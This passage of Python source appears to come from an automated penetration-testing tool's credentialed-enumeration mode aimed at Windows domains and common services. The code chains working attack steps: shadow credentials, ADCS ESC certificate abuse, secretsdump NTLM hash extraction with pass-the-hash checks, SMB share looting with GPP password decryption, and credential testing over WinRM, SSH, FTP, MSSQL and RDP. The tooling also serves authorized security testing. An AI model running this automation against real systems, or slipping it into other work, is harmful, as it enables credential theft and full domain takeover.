        if zip_path:
            findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zip_path.name}`")
            findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")
            print(f"        [+] {zip_path.name}")
        else:
            print(f"        [-] All collection empty — retrying with DCOnly...")
            zip_path = _bh_run("DCOnly", "creds_bloodhound_dconly")
            if zip_path:
                findings.bullet(f"**BloodHound data (DCOnly)** → `loot/bloodhound/{zip_path.name}`")
                findings.add_summary("BloodHound DCOnly collection complete — import zip into BloodHound GUI")
                print(f"        [+] {zip_path.name} (DCOnly)")
            else:
                findings.note("BloodHound collection produced no data — check LDAP connectivity and credentials")
                print(f"        [!] BloodHound collection failed")

    # 5. LAPS / gMSA — read managed account credentials
    if "nxc" in available:
        _check_laps(ip, domain, user, pw, runner, findings, ws, available)
        _check_gmsa(ip, domain, user, pw, runner, findings, ws, available)

    # 6. Writable AD objects — identify GenericWrite targets for shadow creds / ESC9
    writable_targets = _bloodyad_writable(ip, domain, user, pw, runner, findings, ws, available)

    # 7. Shadow credentials — obtain NT hashes for writable user accounts
    shadow_hashes: dict[str, str] = {}
    if writable_targets and "certipy-ad" in available:
        print(f"    [*] Shadow credentials against {len(writable_targets)} writable user(s)...")
        shadow_hashes = _shadow_creds_chain(
            ip, domain, user, pw, writable_targets, runner, findings, ws, available,
        )

    # 8. ADCS template enumeration
    if "certipy-ad" in available:
        cmd = [
            "certipy-ad", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", ip,
            "-stdout",
            "-vulnerable",
        ]
        print(f"    [*] ADCS (certipy-ad)...")
        findings.h4("ADCS Templates (certipy-ad)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_certipy", timeout=120)
        findings.code_block(_trim(out))

        vuln_templates = _parse_adcs_find(out)
        exploitable = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_templates if esc in _EXPLOITABLE_ESC]

        if vuln_templates:
            for ca_name, tmpl, esc in vuln_templates:
                findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
            print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — {len(exploitable)} exploitable")
            for ca, tmpl, esc in exploitable:
                _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
            esc9_templates = [(ca, tmpl) for ca, tmpl, esc in vuln_templates if esc == "ESC9"]
            if esc9_templates and shadow_hashes:
                for ca, tmpl in esc9_templates:
                    for wu, wh in shadow_hashes.items():
                        _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
        elif re.search(r"Found \d+ enabled certificate template", out):
            # -vulnerable returned nothing despite enabled templates existing — run full scan
            findings.note("No vulnerable templates via -vulnerable filter — running full enabled-template scan")
            cmd_full = [
                "certipy-ad", "find",
                "-u", f"{user}@{domain}",
                "-p", pw,
                "-dc-ip", ip,
                "-enabled",
                "-stdout",
                "-output", str(ws.loot_dir / "certipy_full"),
            ]
            print(f"    [*] ADCS fallback: full enabled-template scan...")
            findings.cmd(" ".join(cmd_full))
            out_full = runner.run(cmd_full, "creds_certipy_enabled", timeout=120)
            findings.code_block(_trim(out_full))
            vuln_full = _parse_adcs_find(out_full)
            exploitable_full = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_full if esc in _EXPLOITABLE_ESC]
            if vuln_full:
                for ca_name, tmpl, esc in vuln_full:
                    findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
                print(f"    [+] {len(vuln_full)} vulnerable template(s) in full scan — {len(exploitable_full)} exploitable")
                for ca, tmpl, esc in exploitable_full:
                    _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
                esc9_full = [(ca, tmpl) for ca, tmpl, esc in vuln_full if esc == "ESC9"]
                if esc9_full and shadow_hashes:
                    for ca, tmpl in esc9_full:
                        for wu, wh in shadow_hashes.items():
                            _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
            else:
                nosec_templates = _parse_nosec_templates(out_full)
                if nosec_templates:
                    for ca, tmpl in nosec_templates:
                        findings.add_summary(
                            f"ADCS ESC9 candidate: `{tmpl}` via {ca} (NoSecurityExtension — needs enrollment rights)"
                        )
                    findings.note(
                        f"**{len(nosec_templates)} ESC9 candidate template(s)** with NoSecurityExtension + Client Auth: "
                        + ", ".join(f"`{tmpl}`" for _, tmpl in nosec_templates)
                        + " — gain enrollment rights (e.g. via group membership or ManageCA) to exploit via ESC9 chain"
                    )
                    print(f"    [+] {len(nosec_templates)} ESC9 candidate(s) detected — enrollment rights needed")
                    for _ca, _tmpl in nosec_templates:
                        print(f"        → {_tmpl} via {_ca}")
                else:
                    findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually")
                print(f"    [-] No directly exploitable templates — see findings for candidates")
        elif "ESC" in out:
            for line in out.splitlines():
                if "ESC" in line:
                    findings.add_summary(f"ADCS vuln: {line.strip()}")
            print(f"    [+] Vulnerable ADCS templates found (unparsed)")
        else:
            print(f"    [-] No vulnerable ADCS templates")

    # 6a. Admin command execution — enumerate target via SMB exec using admin creds
    if admin_smb:
        admin_user, admin_pw = admin_smb[0]
        _smb_admin_exec(ip, domain, admin_user, admin_pw, runner, findings, ws, available)

    # 6b. secretsdump — extract NTLM hashes (requires admin/DA credentials)
    if "impacket-secretsdump" in available and admin_smb:
        admin_user, admin_pw = admin_smb[0]
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{admin_user}:{admin_pw}@{ip}",
            "-just-dc-ntlm",
        ]
        print(f"    [*] secretsdump (admin creds: {admin_user})...")
        findings.h4("NTLM Hash Dump (secretsdump)")
        findings.cmd(f"impacket-secretsdump {domain}/{admin_user}:***@{ip} -just-dc-ntlm")
        out = runner.run(cmd, "creds_secretsdump", timeout=300)
        hashes = [l for l in out.splitlines() if ":::" in l and not l.startswith("[")]
        if hashes:
            added = ws.append_hash_file("ntlm.hash", hashes)
            findings.bullet(f"**{len(hashes)} NTLM hashes** ({added} new) → `loot/ntlm.hash`")
            findings.add_summary(f"{len(hashes)} NTLM hashes dumped — crack with hashcat -m 1000 or pass-the-hash")
            print(f"    [+] {len(hashes)} NTLM hashes dumped ({added} new)")
            admin_line = next((l for l in hashes if l.lower().startswith("administrator:")), None)
            if admin_line:
                m_admin = re.search(r":::([0-9a-fA-F]{32})", admin_line)
                if m_admin:
                    _pth_verify(ip, "administrator", m_admin.group(1), runner, findings, ws, available)
        else:
            errors = _error_lines(out)
            if errors:
                findings.code_block(errors)
            print(f"    [!] secretsdump returned no hashes")


# ── Per-service helpers ───────────────────────────────────────────────────────

def _smb_spider(
    ip: str, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    """Download interesting files from accessible SMB shares to loot/creds_smb/<user>/."""
    if "nxc" not in available:
        return
    smb_loot = ws.loot_dir / "creds_smb" / user
    smb_loot.mkdir(parents=True, exist_ok=True)
    cmd = [
        "nxc", "smb", ip,
        "-u", user, "-p", pw,
        "-M", "spider_plus",
        "-o", "DOWNLOAD_FLAG=True",
        f"OUTPUT_FOLDER={smb_loot}",
    ]
    findings.cmd(f"nxc smb {ip} -u {user} -p *** -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=loot/creds_smb/{user}/")
    runner.run(cmd, f"creds_smb_spider_{user}", timeout=180)
    # Exclude spider_plus metadata JSON (IP-named file) from file listing
    files = [f for f in smb_loot.rglob("*") if f.is_file() and not re.match(r"\d+\.\d+\.\d+\.\d+\.json", f.name)]
    if files:
        findings.bullet(f"**{len(files)} SMB files downloaded** → `loot/creds_smb/{user}/`")
        for f in sorted(files):
            rel = f.relative_to(smb_loot)
            findings.bullet(f"  `{rel}` ({f.stat().st_size} B)")
        findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
        print(f"        [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
        _parse_gpp_cpassword(files, findings, ws, available)
    else:
        print(f"        [-] No files downloaded from SMB")


def _parse_gpp_cpassword(
    files: list, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    """Scan downloaded SMB files for GPP cpassword entries and attempt decryption."""
    import base64
    from pathlib import Path

    # Text-based GPP files: XML, inf — grep for cpassword=
    cpassword_re = re.compile(r'cpassword="([^"]+)"', re.IGNORECASE)
    # Registry.pol is binary — look for cpassword as a UTF-16LE string
    binary_re = re.compile(rb'c\x00p\x00a\x00s\x00s\x00w\x00o\x00r\x00d\x00=\x00"((?:[^\x00"]\x00)*)"', re.IGNORECASE)

    found_any = False
    for f in files:
        try:
            if f.suffix.lower() in (".xml", ".inf", ".ini", ".pol", ".txt"):
                # Try text first
                try:
                    text = f.read_text(errors="ignore")
                    for m in cpassword_re.finditer(text):
                        _handle_cpassword(m.group(1), str(f), findings, ws, available)
                        found_any = True
                except Exception:
                    pass
                # Also scan as binary for Registry.pol UTF-16LE encoding
                raw = f.read_bytes()
                for m in binary_re.finditer(raw):
                    cp = m.group(1).decode("utf-16-le", errors="ignore").rstrip('"')
                    if cp:
                        _handle_cpassword(cp, str(f), findings, ws, available)
                        found_any = True
        except Exception:
            pass

    if not found_any:
        findings.note("GPP scan: no cpassword entries found in downloaded files")


def _handle_cpassword(cpassword: str, source: str, findings: ServiceBuffer, ws: Workspace, available: set[str]) -> None:
    findings.bullet(f"**GPP cpassword found** in `{source}`: `{cpassword}`")
    findings.add_summary(f"GPP cpassword in {source} — decrypt with gpp-decrypt")
    if "gpp-decrypt" in available:
        result = subprocess.run(["gpp-decrypt", cpassword], capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout.strip():
            plaintext = result.stdout.strip()
            findings.bullet(f"  **Decrypted:** `{plaintext}`")
            ws.add_cred(plaintext)
            findings.add_summary(f"GPP plaintext password: {plaintext}")
            print(f"        [+] GPP password decrypted: {plaintext}")


def _creds_smb(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"SMB — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping SMB test")
        return
    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--shares"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_smb_shares_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "READ" in out or "WRITE" in out:
        ws.add_valid_cred(user, pw, f"SMB:{port}")
        print(f"        [+] {user}: SMB shares readable — spidering...")
        _smb_spider(ip, user, pw, runner, findings, ws, available)


def _creds_winrm(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"WinRM — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping WinRM test")
        return
    cmd = ["nxc", "winrm", ip, "-u", user, "-p", pw]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_winrm_val_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"WinRM:{port}")
        findings.add_summary(f"WinRM access: `{user}` on port {port}")
        print(f"        [+] {user}: WinRM:{port} valid")
        win_cmds = [
            ("whoami /all",                                                                                      f"creds_winrm_whoami_all_{user}"),
            ("net localgroup administrators",                                                                    f"creds_winrm_localadmins_{user}"),
            ('net group "Domain Admins" /domain',                                                               f"creds_winrm_domainadmins_{user}"),
            ("ipconfig /all",                                                                                    f"creds_winrm_ipconfig_{user}"),
            ("Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,CsDomainRole | Format-List",             f"creds_winrm_sysinfo_{user}"),
        ]
        for win_cmd, label in win_cmds:
            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-X", win_cmd]
            findings.cmd(f"nxc winrm {ip} -u {user} -p *** -X \"{win_cmd}\"")
            out2 = runner.run(cmd2, label, timeout=30)
            findings.code_block(_trim(out2))
    else:
        print(f"        [-] {user}: WinRM:{port} invalid")


def _creds_ssh(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"SSH — {user}")
    full_cmd = [
        "sshpass", "-p", pw,
        "ssh",
        "-o", "BatchMode=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        "-o", "PasswordAuthentication=yes",
        "-p", str(port),
        f"{user}@{ip}",
        (
            "whoami; id; hostname; uname -a 2>/dev/null; "
            "cat /etc/os-release 2>/dev/null | head -3; "
            "sudo -l 2>/dev/null; "
            "cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync 2>/dev/null; "
            "ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20"
        ),
    ]
    findings.cmd(f"sshpass -p *** ssh -p {port} {user}@{ip} 'whoami; hostname; id'")
    out = runner.run(full_cmd, f"creds_ssh_{user}", timeout=20)
    findings.code_block(_trim(out))
    if out.strip() and "Permission denied" not in out and "Authentication failed" not in out:
        ws.add_valid_cred(user, pw, f"SSH:{port}")
        findings.add_summary(f"SSH access: `{user}` on port {port}")
        print(f"        [+] {user}: SSH:{port} valid")
    else:
        print(f"        [-] {user}: SSH:{port} invalid")


def _creds_ftp(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"FTP — {user}")
    findings.cmd(f"curl -sk ftp://{ip}:{port}/ --user {user}:*** --ftp-pasv -l")
    try:
        result = subprocess.run(
            ["curl", "-sk", f"ftp://{ip}:{port}/", "--user", f"{user}:{pw}",
             "--ftp-pasv", "--connect-timeout", "10", "-l"],
            capture_output=True, text=True, timeout=15,
        )
    except subprocess.TimeoutExpired:
        findings.note(f"FTP connection timed out for `{user}`")
        return
    if result.returncode == 0:
        ws.add_valid_cred(user, pw, f"FTP:{port}")
        findings.add_summary(f"FTP access: `{user}` on port {port}")
        findings.bullet("**FTP login successful**")
        print(f"        [+] {user}: FTP:{port} valid")
        if result.stdout.strip():
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("(empty directory listing)")
    else:
        findings.note(f"FTP login failed for `{user}` (exit {result.returncode})")
        print(f"        [-] {user}: FTP:{port} invalid")


def _creds_mssql(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"MSSQL — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping MSSQL test")
        return
    cmd = ["nxc", "mssql", ip, "-u", user, "-p", pw, "--port", str(port),
           "-q", "SELECT name FROM master..sysdatabases"]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_mssql_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"MSSQL:{port}")
        findings.add_summary(f"MSSQL access: `{user}` on port {port}")
        print(f"        [+] {user}: MSSQL:{port} valid")
    else:
        print(f"        [-] {user}: MSSQL:{port} invalid")


def _creds_rdp(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"RDP — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping RDP test")
        return
    cmd = ["nxc", "rdp", ip, "-u", user, "-p", pw, "--port", str(port)]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_rdp_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"RDP:{port}")
        findings.add_summary(f"RDP access: `{user}` on port {port}")
        print(f"        [+] {user}: RDP:{port} valid")
    else:
        print(f"        [-] {user}: RDP:{port} invalid")


# ── Per-service dispatcher ────────────────────────────────────────────────────

_SERVICE_HANDLERS: dict[int, str] = {
    21:   "ftp",
    22:   "ssh",
    139:  "smb",
    445:  "smb",
    1433: "mssql",
    3389: "rdp",
    5985: "winrm",
    5986: "winrm",
}

_NAME_HANDLERS: dict[str, str] = {
    "ftp":          "ftp",
    "ssh":          "ssh",
    "microsoft-ds": "smb",
    "netbios":      "smb",
    "ms-sql":       "mssql",
    "rdp":          "rdp",
    "winrm":        "winrm",
}


def _enumerate_services(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    if not services:
        return
    findings.h3("Per-Service Credentialed Enumeration")

    seen_kinds: set[str] = set()
    for svc in services:
        kind = _SERVICE_HANDLERS.get(svc.port)
        if kind is None:
            for pat, k in _NAME_HANDLERS.items():
                if pat in svc.name.lower():
                    kind = k
                    break
        if kind is None:
            continue
        # Deduplicate: only enumerate each kind once (e.g. SMB on both 139 and 445)
        dedup_key = f"{kind}:{svc.port}"
        if dedup_key in seen_kinds:
            continue
        seen_kinds.add(dedup_key)

        buf = ServiceBuffer(svc.port, svc.proto)
        buf.h3(f"TCP {svc.port} — {svc.name.upper()} (credentialed)")
        print(f"    [*] {kind.upper()} {ip}:{svc.port} — testing {len(creds)} credential(s)...")

        for user, pw in creds:
            if kind == "smb":
                _creds_smb(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "winrm":
                _creds_winrm(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "ssh":
                _creds_ssh(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "ftp":
                _creds_ftp(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "mssql":
                _creds_mssql(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "rdp":
                _creds_rdp(ip, svc.port, domain, user, pw, runner, buf, ws, available)

        findings.flush_service_buffer(buf)


# ── Main entry ────────────────────────────────────────────────────────────────

def run_creds_mode(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    findings.h2("Credentialed Enumeration")

    if not creds:
        findings.note("No credentials provided.")
        return

    cred_list = ", ".join(f"`{u}`" for u, _ in creds)
    findings.bullet(f"Testing {len(creds)} credential set(s): {cred_list}")
    print(f"[*] Creds mode — {len(creds)} pair(s): {', '.join(u for u, _ in creds)}")

    # Phase 1: Validate all creds against SMB (fast, works without domain)
    print(f"\n[*] Phase 1: SMB credential validation...")
    valid_smb, admin_smb = _validate_smb(ip, creds, runner, findings, ws, available)
    print(f"    {len(valid_smb)} valid / {len(creds)} tested  ({len(admin_smb)} admin)")

    # Phase 2: AD core with best available cred (prefer validated, fall back to first provided)
    if domain:
        user, pw = valid_smb[0] if valid_smb else creds[0]
        print(f"\n[*] Phase 2: AD core enumeration as {user}@{domain}...")
        _ad_core(ip, domain, user, pw, runner, findings, ws, available, admin_smb)
    else:
        findings.note("No `--domain` specified — skipping AD core enumeration")
        print("[!] No --domain — skipping AD core enumeration")

    # Phase 3: Per-service credentialed enumeration against discovered services
    print(f"\n[*] Phase 3: Per-service enumeration ({len(services)} service(s))...")
    _enumerate_services(ip, domain, creds, services, runner, findings, ws, available)

    print(f"\n[+] Creds mode complete — {ws.findings_path}")
